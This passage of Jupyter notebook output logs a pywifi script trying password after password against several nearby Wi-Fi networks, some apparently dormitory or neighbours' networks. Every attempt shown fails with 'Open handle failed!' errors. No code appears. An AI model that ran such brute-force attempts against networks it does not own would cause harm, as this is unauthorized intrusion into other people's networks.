      "num= 17 Fail Current WifiName: whhh Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:38,009 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: Ruoshui317 Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:43,581 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: 311 Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:49,144 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: 321sushe Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:54,718 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: 313 Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:00,293 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: BP2197 Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:05,867 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:11,442 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: whhh Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:16,464 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: Ruoshui317 Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:22,040 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: 311 Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:27,615 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: 321sushe Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:33,184 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 18 Fail Current WifiName: 313 Current Password: eEA80839916\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:38,760 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: BP2197 Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:44,338 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:49,916 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: whhh Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:56:54,942 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: Ruoshui317 Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:00,520 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: 311 Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:06,095 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: 321sushe Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:11,677 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 20 Fail Current WifiName: 313 Current Password: zGU8463167\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:17,261 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: BP2197 Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:22,834 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:28,404 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: whhh Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:33,425 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: Ruoshui317 Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:38,999 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: 311 Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:44,583 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: 321sushe Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:50,166 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 21 Fail Current WifiName: 313 Current Password: 851632Bku\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:57:55,740 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: BP2197 Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:01,313 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:06,889 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: whhh Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:11,909 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: Ruoshui317 Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:17,493 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: 311 Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:23,059 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: 321sushe Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:28,621 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 22 Fail Current WifiName: 313 Current Password: jih68413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:34,193 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: BP2197 Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:39,770 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:45,346 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: whhh Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:50,358 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: Ruoshui317 Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:58:55,924 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: 311 Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:01,495 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: 321sushe Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:07,071 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 23 Fail Current WifiName: 313 Current Password: 42183337Mf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:12,637 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: BP2197 Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:18,209 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:23,796 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: whhh Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:28,822 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: Ruoshui317 Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:34,403 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: 311 Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:39,979 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: 321sushe Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:45,566 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 24 Fail Current WifiName: 313 Current Password: uq5304399\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:51,137 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: BP2197 Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:59:56,711 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:02,288 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: whhh Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:07,323 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: Ruoshui317 Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:12,897 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: 311 Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:18,463 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: 321sushe Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:24,040 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 25 Fail Current WifiName: 313 Current Password: 5825337qBT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:29,621 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: BP2197 Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:35,200 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:40,784 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: whhh Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:45,798 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: Ruoshui317 Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:51,364 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: 311 Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:00:56,939 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: 321sushe Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:02,517 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 26 Fail Current WifiName: 313 Current Password: HCx93835\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:08,090 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: BP2197 Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:13,655 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:19,229 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: whhh Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:24,263 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: Ruoshui317 Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:29,834 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: 311 Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:35,414 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: 321sushe Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:40,982 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 27 Fail Current WifiName: 313 Current Password: 38651bbN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:46,551 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: BP2197 Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:52,124 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:01:57,697 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: whhh Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:02,717 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: Ruoshui317 Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:08,283 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: 311 Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:13,854 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: 321sushe Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:19,431 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 28 Fail Current WifiName: 313 Current Password: maX877019\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:25,014 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: BP2197 Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:30,591 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:36,165 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: whhh Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:41,183 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: Ruoshui317 Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:46,760 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: 311 Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:52,332 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: 321sushe Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:02:57,916 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 29 Fail Current WifiName: 313 Current Password: 13575nPI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:03,488 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: BP2197 Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:09,062 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:14,636 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: whhh Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:19,660 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: Ruoshui317 Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:25,232 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: 311 Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:30,807 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: 321sushe Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:36,374 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 31 Fail Current WifiName: 313 Current Password: 14815Azw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:41,947 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: BP2197 Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:47,524 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:53,099 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: whhh Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:03:58,130 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: Ruoshui317 Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:03,703 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: 311 Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:09,255 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: 321sushe Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:14,831 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 32 Fail Current WifiName: 313 Current Password: dUJ357049\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:20,424 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: BP2197 Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:26,009 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:31,579 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: whhh Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:36,599 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: Ruoshui317 Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:42,173 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: 311 Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:47,747 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
